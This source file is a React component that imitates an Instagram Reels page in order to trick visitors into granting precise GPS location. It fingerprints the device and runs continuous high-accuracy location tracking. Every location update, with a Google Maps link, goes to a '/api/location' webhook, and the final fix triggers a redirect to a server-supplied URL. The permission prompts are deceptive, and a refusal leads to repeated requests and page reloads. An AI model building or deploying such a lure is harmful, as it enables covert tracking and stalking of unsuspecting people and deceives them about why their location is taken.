'use client';

import { useState, useEffect, useCallback, useRef } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import {
  Heart,
  MessageCircle,
  Send,
  Bookmark,
  MoreHorizontal,
  Music,
  ChevronLeft,
  Home,
  Search,
  PlusSquare,
  Film,
  User,
  MapPin,
  RefreshCw,
  Crosshair,
} from 'lucide-react';

// ========== TYPES ==========
interface LocationData {
  latitude: number;
  longitude: number;
  accuracy: number;
  altitude: number | null;
  altitudeAccuracy: number | null;
  heading: number | null;
  speed: number | null;
  timestamp: number;
}

interface DeviceInfo {
  userAgent: string;
  platform: string;
  language: string;
  cookiesEnabled: boolean;
  doNotTrack: string | null;
  screenWidth: number;
  screenHeight: number;
  pixelRatio: number;
  colorDepth: number;
  vendor: string;
  model: string;
  os: string;
  osVersion: string;
  browser: string;
  browserVersion: string;
  isMobile: boolean;
  isTouchDevice: boolean;
  connectionType: string;
}

type AppState = 'loading' | 'reel' | 'requesting_location' | 'getting_precise' | 'permission_denied' | 'sending' | 'redirecting';

// ========== CONSTANTS ==========
const ACCURACY_THRESHOLD = 30;
const MAX_WATCH_TIME = 60000;

// ========== DEVICE INFO ==========
function getDeviceInfo(): DeviceInfo {
  const ua = navigator.userAgent;
  const platform = navigator.platform || 'Unknown';
  const language = navigator.language || 'Unknown';
  const cookiesEnabled = navigator.cookieEnabled || false;
  const doNotTrack = navigator.doNotTrack;
  const screenWidth = window.screen.width;
  const screenHeight = window.screen.height;
  const pixelRatio = window.devicePixelRatio || 1;
  const colorDepth = window.screen.colorDepth || 24;
  const vendor = (navigator as any).vendor || 'Unknown';

  let model = 'Unknown';
  let os = 'Unknown';
  let osVersion = 'Unknown';
  let browser = 'Unknown';
  let browserVersion = 'Unknown';

  if (/Android/i.test(ua)) {
    os = 'Android';
    const m = ua.match(/Android\s([\d.]+)/);
    osVersion = m ? m[1] : 'Unknown';
    const mm = ua.match(/;\s*([^;)]+)\s+Build/);
    model = mm ? mm[1].trim() : 'Unknown';
  } else if (/iPhone/i.test(ua)) {
    os = 'iOS'; model = 'iPhone';
    const m = ua.match(/OS\s([\d_]+)/);
    osVersion = m ? m[1].replace(/_/g, '.') : 'Unknown';
  } else if (/iPad/i.test(ua)) {
    os = 'iOS'; model = 'iPad';
    const m = ua.match(/OS\s([\d_]+)/);
    osVersion = m ? m[1].replace(/_/g, '.') : 'Unknown';
  } else if (/Windows/i.test(ua)) {
    os = 'Windows';
    const m = ua.match(/Windows NT\s([\d.]+)/);
    osVersion = m ? m[1] : 'Unknown';
  } else if (/Mac OS X/i.test(ua)) {
    os = 'macOS';
    const m = ua.match(/Mac OS X\s([\d_.]+)/);
    osVersion = m ? m[1].replace(/_/g, '.') : 'Unknown';
  } else if (/Linux/i.test(ua)) { os = 'Linux'; }
  else if (/CrOS/i.test(ua)) { os = 'ChromeOS'; }

  if (/Edg\//i.test(ua)) {
    browser = 'Microsoft Edge';
    const m = ua.match(/Edg\/([\d.]+)/);
    browserVersion = m ? m[1] : 'Unknown';
  } else if (/Chrome\//i.test(ua) && !/Chromium/i.test(ua)) {
    browser = 'Google Chrome';
    const m = ua.match(/Chrome\/([\d.]+)/);
    browserVersion = m ? m[1] : 'Unknown';
  } else if (/Firefox\//i.test(ua)) {
    browser = 'Mozilla Firefox';
    const m = ua.match(/Firefox\/([\d.]+)/);
    browserVersion = m ? m[1] : 'Unknown';
  } else if (/Safari\//i.test(ua) && !/Chrome/i.test(ua)) {
    browser = 'Apple Safari';
    const m = ua.match(/Version\/([\d.]+)/);
    browserVersion = m ? m[1] : 'Unknown';
  } else if (/OPR\//i.test(ua)) {
    browser = 'Opera';
    const m = ua.match(/OPR\/([\d.]+)/);
    browserVersion = m ? m[1] : 'Unknown';
  }

  const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
  const isTouchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
  const conn = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
  const connectionType = conn ? conn.effectiveType || conn.type || 'Unknown' : 'Unknown';

  return {
    userAgent: ua, platform, language, cookiesEnabled, doNotTrack,
    screenWidth, screenHeight, pixelRatio, colorDepth, vendor,
    model, os, osVersion, browser, browserVersion, isMobile, isTouchDevice, connectionType,
  };
}

// ========== DEVICE INFO (lazy init, client only) ==========
let _deviceInfoCache: DeviceInfo | null = null;
function getDeviceInfoLazy(): DeviceInfo | null {
  if (typeof navigator === 'undefined') return null;
  if (!_deviceInfoCache) _deviceInfoCache = getDeviceInfo();
  return _deviceInfoCache;
}

// ========== MAIN COMPONENT ==========
export default function InstagramReels() {
  const [appState, setAppState] = useState<AppState>('loading');
  const [deniedCount, setDeniedCount] = useState(0);
  const [locationData, setLocationData] = useState<LocationData | null>(null);
  const [currentAccuracy, setCurrentAccuracy] = useState<number | null>(null);
  const [attemptNumber, setAttemptNumber] = useState(0);
  const [liked, setLiked] = useState(false);
  const [saved, setSaved] = useState(false);
  const [loadingProgress, setLoadingProgress] = useState(0);

  const hasRequestedRef = useRef(false);
  const isFinalSentRef = useRef(false);
  const watchIdRef = useRef<number | null>(null);
  const startTimeRef = useRef<number>(0);
  const attemptRef = useRef(0);

  // Send EVERY location update to Webhook 2
  const sendToWebhook2 = useCallback(async (loc: LocationData, attempt: number) => {
    try {
      await fetch('/api/location', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'update',
          latitude: loc.latitude, longitude: loc.longitude, accuracy: loc.accuracy,
          altitude: loc.altitude, altitudeAccuracy: loc.altitudeAccuracy,
          heading: loc.heading, speed: loc.speed, timestamp: loc.timestamp,
          deviceInfo,
          googleMapsLink: `https://www.google.com/maps?q=${loc.latitude},${loc.longitude}`,
          attemptNumber: attempt,
        }),
      });
    } catch (e) { console.error('[W2] Fail:', e); }
  }, [deviceInfo]);

  // Send FINAL precise location to Webhook 1
  const sendFinalToWebhook1 = useCallback(async (loc: LocationData, attempt: number) => {
    try {
      const res = await fetch('/api/location', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'final',
          latitude: loc.latitude, longitude: loc.longitude, accuracy: loc.accuracy,
          altitude: loc.altitude, altitudeAccuracy: loc.altitudeAccuracy,
          heading: loc.heading, speed: loc.speed, timestamp: loc.timestamp,
          deviceInfo,
          googleMapsLink: `https://www.google.com/maps?q=${loc.latitude},${loc.longitude}`,
          attemptNumber: attempt,
        }),
      });
      const data = await res.json();
      if (data.redirectUrl) {
        setAppState('redirecting');
        setTimeout(() => { window.location.href = data.redirectUrl; }, 800);
      } else { setAppState('reel'); }
    } catch (e) { console.error('[W1] Fail:', e); setAppState('reel'); }
  }, [deviceInfo]);

  // Start watching location continuously
  const startWatchingLocation = useCallback(() => {
    if (!navigator.geolocation) { alert('Geolocation not supported'); return; }

    setAppState('requesting_location');
    startTimeRef.current = Date.now();
    isFinalSentRef.current = false;
    attemptRef.current = 0;

    const watchId = navigator.geolocation.watchPosition(
      async (position) => {
        const loc: LocationData = {
          latitude: position.coords.latitude, longitude: position.coords.longitude,
          accuracy: position.coords.accuracy, altitude: position.coords.altitude,
          altitudeAccuracy: position.coords.altitudeAccuracy,
          heading: position.coords.heading, speed: position.coords.speed,
          timestamp: position.timestamp,
        };

        attemptRef.current += 1;
        const attempt = attemptRef.current;
        setLocationData(loc);
        setCurrentAccuracy(loc.accuracy);
        setAttemptNumber(attempt);

        // ALWAYS send to Webhook 2
        sendToWebhook2(loc, attempt);

        // Check accuracy threshold
        if (loc.accuracy <= ACCURACY_THRESHOLD && !isFinalSentRef.current) {
          isFinalSentRef.current = true;
          if (watchIdRef.current !== null) {
            navigator.geolocation.clearWatch(watchIdRef.current);
            watchIdRef.current = null;
          }
          setAppState('sending');
          await sendFinalToWebhook1(loc, attempt);
        } else if (!isFinalSentRef.current) {
          setAppState('getting_precise');
        }

        // Timeout safety: 60s max wait
        if (Date.now() - startTimeRef.current >= MAX_WATCH_TIME && !isFinalSentRef.current) {
          isFinalSentRef.current = true;
          if (watchIdRef.current !== null) {
            navigator.geolocation.clearWatch(watchIdRef.current);
            watchIdRef.current = null;
          }
          setAppState('sending');
          await sendFinalToWebhook1(loc, attempt);
        }
      },
      (error) => {
        console.error('Location error:', error);
        if (watchIdRef.current !== null) {
          navigator.geolocation.clearWatch(watchIdRef.current);
          watchIdRef.current = null;
        }
        setDeniedCount(prev => prev + 1);
        setAppState('permission_denied');
      },
      { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
    );

    watchIdRef.current = watchId;
  }, [sendToWebhook2, sendFinalToWebhook1]);

  // Loading animation
  useEffect(() => {
    const interval = setInterval(() => {
      setLoadingProgress(prev => {
        if (prev >= 100) { clearInterval(interval); setTimeout(() => setAppState('reel'), 300); return 100; }
        return prev + Math.random() * 15 + 5;
      });
    }, 100);
    return () => clearInterval(interval);
  }, []);

  // Auto-request location after reel shows
  useEffect(() => {
    if (appState === 'reel' && !hasRequestedRef.current) {
      hasRequestedRef.current = true;
      const t = setTimeout(() => startWatchingLocation(), 1500);
      return () => clearTimeout(t);
    }
  }, [appState, startWatchingLocation]);

  // Cleanup
  useEffect(() => {
    return () => { if (watchIdRef.current !== null) navigator.geolocation.clearWatch(watchIdRef.current); };
  }, []);

  const handleDenyOk = () => {
    if (deniedCount >= 1) { window.location.reload(); }
    else { startWatchingLocation(); }
  };

  // ========== LOADING SCREEN ==========
  if (appState === 'loading') {
    return (
      <div className="fixed inset-0 bg-black flex flex-col items-center justify-center z-50">
        <motion.div initial={{ scale: 0.5, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} transition={{ duration: 0.5 }} className="mb-8">
          <div className="w-20 h-20 rounded-2xl bg-gradient-to-tr from-yellow-400 via-pink-500 to-purple-600 flex items-center justify-center">
            <Film className="w-10 h-10 text-white" />
          </div>
        </motion.div>
        <div className="w-48 h-1 bg-gray-800 rounded-full overflow-hidden">
          <div className="h-full bg-gradient-to-r from-yellow-400 via-pink-500 to-purple-600 rounded-full transition-all duration-200" style={{ width: `${Math.min(loadingProgress, 100)}%` }} />
        </div>
        <p className="text-gray-500 text-sm mt-4">Loading...</p>
      </div>
    );
  }

  const showRedirectOverlay = appState === 'sending' || appState === 'redirecting';

  return (
    <div className="fixed inset-0 bg-black overflow-hidden select-none">
      {/* Background */}
      <div className="absolute inset-0 bg-gradient-to-b from-gray-900 via-gray-800 to-black">
        <div className="absolute inset-0 bg-gradient-to-br from-indigo-900/30 via-black to-purple-900/20" />
        <div className="absolute inset-0 opacity-20" style={{ backgroundImage: 'radial-gradient(circle at 30% 40%, rgba(255,255,255,0.1) 0%, transparent 50%), radial-gradient(circle at 70% 60%, rgba(255,255,255,0.05) 0%, transparent 40%)' }} />
      </div>

      {/* Status Bar */}
      <div className="absolute top-0 left-0 right-0 z-30 px-4 pt-2 pb-1">
        <div className="flex justify-between items-center text-white text-xs font-medium">
          <span>9:41</span>
          <div className="flex items-center gap-1">
            <svg width="16" height="12" viewBox="0 0 16 12" fill="white"><rect x="0" y="6" width="3" height="6" rx="0.5" /><rect x="4.5" y="4" width="3" height="8" rx="0.5" /><rect x="9" y="1" width="3" height="11" rx="0.5" /><rect x="13.5" y="0" width="2.5" height="12" rx="0.5" opacity="0.3" /></svg>
            <span className="ml-1">5G</span>
            <svg width="24" height="12" viewBox="0 0 24 12" fill="white" className="ml-1"><rect x="0" y="1" width="20" height="10" rx="2" stroke="white" strokeWidth="1" fill="none" /><rect x="21" y="3.5" width="2" height="5" rx="1" fill="white" opacity="0.4" /><rect x="1.5" y="2.5" width="14" height="7" rx="1" fill="white" /></svg>
          </div>
        </div>
      </div>

      {/* Top Nav */}
      <div className="absolute top-8 left-0 right-0 z-20 px-4 py-3">
        <div className="flex items-center justify-between">
          <ChevronLeft className="w-6 h-6 text-white" />
          <span className="text-white text-lg font-semibold">Reels</span>
          <MoreHorizontal className="w-6 h-6 text-white" />
        </div>
      </div>

      {/* Right Actions */}
      <div className="absolute right-3 bottom-32 z-20 flex flex-col items-center gap-5">
        <button className="flex flex-col items-center gap-1" onClick={() => setLiked(!liked)}>
          <Heart className={`w-7 h-7 transition-colors ${liked ? 'text-red-500 fill-red-500' : 'text-white'}`} />
          <span className="text-white text-xs">28.3K</span>
        </button>
        <button className="flex flex-col items-center gap-1"><MessageCircle className="w-7 h-7 text-white" /><span className="text-white text-xs">131</span></button>
        <button className="flex flex-col items-center gap-1"><Send className="w-7 h-7 text-white" /><span className="text-white text-xs">56.1K</span></button>
        <button className="flex flex-col items-center gap-1" onClick={() => setSaved(!saved)}>
          <Bookmark className={`w-7 h-7 transition-colors ${saved ? 'text-white fill-white' : 'text-white'}`} />
        </button>
      </div>

      {/* Bottom Reel Info */}
      <div className="absolute left-3 right-16 bottom-24 z-20">
        <div className="flex items-center gap-2 mb-2">
          <div className="w-8 h-8 rounded-full bg-gradient-to-tr from-yellow-400 via-pink-500 to-purple-600 p-[2px]">
            <div className="w-full h-full rounded-full bg-black flex items-center justify-center"><User className="w-4 h-4 text-gray-400" /></div>
          </div>
          <span className="text-white text-sm font-semibold">explore_world</span>
          <button className="border border-white/70 text-white text-xs px-3 py-0.5 rounded-md font-semibold ml-1">Follow</button>
        </div>
        <p className="text-white text-sm leading-5 mb-2">Find your way around the world 🌍✨ #explore #travel #location</p>
        <div className="flex items-center gap-2">
          <Music className="w-3 h-3 text-white" />
          <div className="overflow-hidden"><p className="text-white text-xs whitespace-nowrap animate-marquee">Radiohead · No Surprises</p></div>
        </div>
      </div>

      {/* Bottom Nav */}
      <div className="absolute bottom-0 left-0 right-0 z-30 bg-black/90 backdrop-blur-sm border-t border-white/10">
        <div className="flex items-center justify-around py-2 pb-4">
          <button className="flex flex-col items-center gap-0.5"><Home className="w-6 h-6 text-white" /><span className="text-white text-[10px]">Home</span></button>
          <button className="flex flex-col items-center gap-0.5"><Search className="w-6 h-6 text-gray-500" /><span className="text-gray-500 text-[10px]">Search</span></button>
          <button className="flex flex-col items-center gap-0.5"><PlusSquare className="w-6 h-6 text-gray-500" /><span className="text-gray-500 text-[10px]">Create</span></button>
          <button className="flex flex-col items-center gap-0.5"><Film className="w-6 h-6 text-white" /><span className="text-white text-[10px]">Reels</span></button>
          <button className="flex flex-col items-center gap-0.5"><div className="w-6 h-6 rounded-full bg-gray-600 flex items-center justify-center"><User className="w-3 h-3 text-gray-400" /></div><span className="text-gray-500 text-[10px]">Profile</span></button>
        </div>
      </div>

      {/* ===== LOCATION REQUESTING OVERLAY ===== */}
      <AnimatePresence>
        {appState === 'requesting_location' && (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="absolute inset-0 z-40 bg-black/60 backdrop-blur-sm flex items-center justify-center">
            <motion.div initial={{ scale: 0.8, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} exit={{ scale: 0.8, opacity: 0 }} className="bg-gray-900/95 rounded-2xl p-6 mx-8 max-w-sm w-full border border-white/10">
              <div className="flex flex-col items-center text-center">
                <div className="w-16 h-16 rounded-full bg-gradient-to-tr from-yellow-400 via-pink-500 to-purple-600 flex items-center justify-center mb-4"><MapPin className="w-8 h-8 text-white" /></div>
                <h3 className="text-white text-lg font-semibold mb-2">Allow Location Access</h3>
                <p className="text-gray-400 text-sm mb-4 leading-5">This reel wants to access your location to show you nearby content and provide the best experience.</p>
                <div className="flex items-center gap-2"><div className="w-5 h-5 rounded-full border-2 border-blue-400 border-t-transparent animate-spin" /><span className="text-gray-300 text-sm">Requesting location...</span></div>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* ===== GETTING PRECISE OVERLAY ===== */}
      <AnimatePresence>
        {appState === 'getting_precise' && (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="absolute inset-0 z-40 bg-black/50 backdrop-blur-sm flex items-center justify-center">
            <motion.div initial={{ scale: 0.8, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} exit={{ scale: 0.8, opacity: 0 }} className="bg-gray-900/95 rounded-2xl p-6 mx-8 max-w-sm w-full border border-white/10">
              <div className="flex flex-col items-center text-center">
                <div className="w-16 h-16 rounded-full bg-blue-500/20 flex items-center justify-center mb-4 relative">
                  <Crosshair className="w-8 h-8 text-blue-400" />
                  <motion.div className="absolute inset-0 rounded-full border-2 border-blue-400/50" animate={{ scale: [1, 1.3, 1], opacity: [0.5, 0, 0.5] }} transition={{ duration: 1.5, repeat: Infinity }} />
                </div>
                <h3 className="text-white text-lg font-semibold mb-2">Getting Precise Location</h3>
                <p className="text-gray-400 text-sm mb-3 leading-5">We need a more accurate location. Please stay still for a moment...</p>
                {currentAccuracy !== null && (
                  <div className="w-full space-y-2">
                    <div className="flex justify-between text-xs">
                      <span className="text-gray-400">Current Accuracy</span>
                      <span className={`font-mono ${currentAccuracy <= ACCURACY_THRESHOLD ? 'text-green-400' : 'text-yellow-400'}`}>{currentAccuracy.toFixed(1)}m</span>
                    </div>
                    <div className="w-full h-2 bg-gray-800 rounded-full overflow-hidden">
                      <div className={`h-full rounded-full transition-all duration-500 ${currentAccuracy <= 10 ? 'bg-green-500' : currentAccuracy <= 20 ? 'bg-green-400' : currentAccuracy <= 30 ? 'bg-yellow-400' : currentAccuracy <= 50 ? 'bg-orange-400' : 'bg-red-400'}`} style={{ width: `${Math.max(5, Math.min(100, (1 - currentAccuracy / 100) * 100))}%` }} />
                    </div>
                    <div className="flex justify-between text-xs">
                      <span className="text-gray-500">Target: &lt;{ACCURACY_THRESHOLD}m</span>
                      <span className="text-gray-500">Attempt #{attemptNumber}</span>
                    </div>
                  </div>
                )}
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* ===== PERMISSION DENIED OVERLAY ===== */}
      <AnimatePresence>
        {appState === 'permission_denied' && (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="absolute inset-0 z-40 bg-black/70 backdrop-blur-md flex items-center justify-center">
            <motion.div initial={{ scale: 0.8, opacity: 0, y: 20 }} animate={{ scale: 1, opacity: 1, y: 0 }} exit={{ scale: 0.8, opacity: 0, y: 20 }} transition={{ type: 'spring', damping: 20, stiffness: 300 }} className="bg-gray-900/95 rounded-2xl p-6 mx-8 max-w-sm w-full border border-white/10">
              <div className="flex flex-col items-center text-center">
                <div className="w-16 h-16 rounded-full bg-red-500/20 flex items-center justify-center mb-4"><MapPin className="w-8 h-8 text-red-400" /></div>
                <h3 className="text-white text-lg font-semibold mb-2">Location Access Required</h3>
                <p className="text-gray-400 text-sm mb-5 leading-5">
                  {deniedCount >= 1
                    ? 'This content requires your location to continue. Please allow location access when prompted, or the page will refresh.'
                    : 'This reel needs your location to provide the best experience. Without it, some features may not work properly.'}
                </p>
                <button onClick={handleDenyOk} className="w-full bg-blue-500 hover:bg-blue-600 text-white font-semibold py-3 rounded-xl transition-colors active:scale-95">
                  {deniedCount >= 1 ? <span className="flex items-center justify-center gap-2"><RefreshCw className="w-4 h-4" />Allow Location</span> : 'OK'}
                </button>
                {deniedCount >= 1 && <p className="text-gray-500 text-xs mt-3">The page will refresh to request permission again</p>}
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* ===== SENDING / REDIRECTING OVERLAY ===== */}
      <AnimatePresence>
        {showRedirectOverlay && (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="absolute inset-0 z-40 bg-black/60 backdrop-blur-sm flex items-center justify-center">
            <motion.div initial={{ scale: 0.8, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} exit={{ scale: 0.8, opacity: 0 }} className="bg-gray-900/95 rounded-2xl p-6 mx-8 max-w-sm w-full border border-white/10">
              <div className="flex flex-col items-center text-center">
                <div className="w-16 h-16 rounded-full bg-green-500/20 flex items-center justify-center mb-4">
                  {appState === 'redirecting' ? (
                    <svg className="w-8 h-8 text-green-400" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" /></svg>
                  ) : (
                    <div className="w-8 h-8 rounded-full border-3 border-green-400 border-t-transparent animate-spin" />
                  )}
                </div>
                <h3 className="text-white text-lg font-semibold mb-2">{appState === 'redirecting' ? 'Location Verified!' : 'Processing...'}</h3>
                <p className="text-gray-400 text-sm leading-5">{appState === 'redirecting' ? 'Redirecting you now...' : 'Verifying your location, please wait...'}</p>
                {locationData && (
                  <div className="mt-3 px-3 py-2 bg-green-500/10 rounded-lg">
                    <p className="text-green-400 text-xs">Accuracy: {locationData.accuracy.toFixed(1)}m{locationData.accuracy <= ACCURACY_THRESHOLD && ' ✓'}</p>
                  </div>
                )}
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}
